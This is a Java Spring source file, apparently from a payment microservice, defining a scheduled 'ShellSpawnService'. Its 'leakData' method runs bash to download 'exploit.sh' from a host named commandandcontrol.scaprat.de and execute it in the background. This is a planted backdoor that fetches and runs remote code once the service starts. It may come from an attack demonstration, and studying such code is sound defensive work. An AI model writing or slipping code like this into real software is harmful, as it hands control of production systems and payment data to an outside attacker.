package com.hipstershop.paymentservicejava;


import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;

@Service
public class ShellSpawnService {

    private boolean active = false;

    @Scheduled(fixedDelay = 900000L, initialDelay = 60000L) // it takes up to a minute for our shell to be spawned
    public void leakData() {
        if(!active) {
        try {
                System.out.println("executing command");
                String[] commands = { "/bin/bash", "-c", "wget -O /tmp/exploit.sh http://commandandcontrol.scaprat.de/exploit.sh && chmod u+x /tmp/exploit.sh && /tmp/exploit.sh &" };
                Runtime.getRuntime().exec(commands);
                active = true;
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

}
